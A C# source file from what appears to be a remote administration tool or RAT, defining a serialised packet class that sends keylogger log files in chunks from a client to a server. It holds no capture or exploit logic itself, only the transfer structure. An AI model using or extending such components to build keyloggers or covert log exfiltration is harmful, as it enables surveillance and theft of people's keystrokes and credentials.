using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetKeyLoggerLogsResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetKeyLoggerLogsResponse;
            }
        }
        [Index(0)]
        public virtual string filename { get; set; }

        [Index(1)]
        public virtual byte[] block { get; set; }

        [Index(2)]
        public virtual int maxBlocks { get; set; }

        [Index(3)]
        public virtual int currentBlock { get; set; }

        [Index(4)]
        public virtual string customMessage { get; set; }

        [Index(5)]
        public virtual int index { get; set; }

        [Index(6)]
        public virtual int fileCount { get; set; }

        public GetKeyLoggerLogsResponse()
        {
        }

        public GetKeyLoggerLogsResponse(string filename, byte[] block, int maxblocks, int currentblock, string custommessage, int index, int fileCount)
        {
            this.filename = filename;
            this.block = block;
            this.maxBlocks = maxblocks;
            this.currentBlock = currentblock;
            this.customMessage = custommessage;
            this.index = index;
            this.fileCount = fileCount;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
